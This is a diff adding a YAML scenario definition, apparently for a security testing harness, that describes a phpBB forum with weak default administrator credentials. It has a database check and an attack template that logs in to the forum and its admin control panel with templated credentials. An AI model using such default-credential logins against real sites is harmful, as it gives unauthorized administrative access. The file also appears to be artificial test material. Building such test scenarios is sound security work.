@@ -1,0 +1,11 @@
+id: phpbb_default_creds
+description: phpBB forum with weak/default administrator credentials
+compatible_presets:
+  - phpbb
+vuln_config_snippet: ""
+testing_snippet_template: |
+  mysql -u {{db_user}} -p{{db_password}} {{db_name}} -N -e "SELECT username FROM phpbb_users WHERE group_id=5" | grep "{{admin_user}}"
+attack_snippet_template: |
+  source /tmp/harnesses/phpbb_helpers.sh
+  phpbb_login "http://target:{{port}}/phpBB3" "{{admin_user}}" "{{admin_password}}" && echo "PHPBB_LOGIN_SUCCESS"
+  phpbb_admin_login "http://target:{{port}}/phpBB3" "{{admin_user}}" "{{admin_password}}" && echo "PHPBB_ACP_SUCCESS"
